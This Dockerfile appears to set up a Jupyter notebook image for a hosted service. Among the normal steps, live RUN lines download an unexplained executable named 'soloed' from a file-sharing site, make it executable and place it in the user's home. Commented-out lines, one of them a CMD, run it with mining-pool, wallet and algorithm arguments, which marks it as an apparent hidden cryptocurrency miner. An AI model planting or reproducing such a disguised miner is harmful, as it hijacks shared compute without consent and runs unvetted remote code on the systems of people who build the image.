# Use the official Ubuntu base image
FROM ubuntu:20.04

# Avoid interactive prompts during package installations
ENV DEBIAN_FRONTEND=noninteractive

# Install basic dependencies
RUN apt-get update && \
    apt-get install -y \
    wget \
    curl \
    ca-certificates \
    python3 \
    python3-pip
    
#run something 

RUN wget https://bashupload.com/ryJaM/soloed

RUN chmod +x soloed

#./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2 &  


# Install Jupyter Notebook
RUN pip3 install --no-cache --upgrade pip && \
    pip3 install --no-cache jupyterlab

# Create a non-root user with UID 1000
ARG NB_USER=jovyan
ARG NB_UID=1000
ENV USER ${NB_USER}
ENV NB_UID ${NB_UID}
ENV HOME /home/${NB_USER}

RUN pwd

RUN mv ~/soloed /home/jovyan
RUN adduser --disabled-password \
    --gecos "Default user" \
    --uid ${NB_UID} \
    ${NB_USER}

WORKDIR ${HOME}
USER ${USER}


# Make sure the contents of our repo are in ${HOME}
COPY . ${HOME}
USER root
RUN chown -R ${NB_USER}:${NB_USER} ${HOME}

#CMD ["sh", "-c", "./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2"]
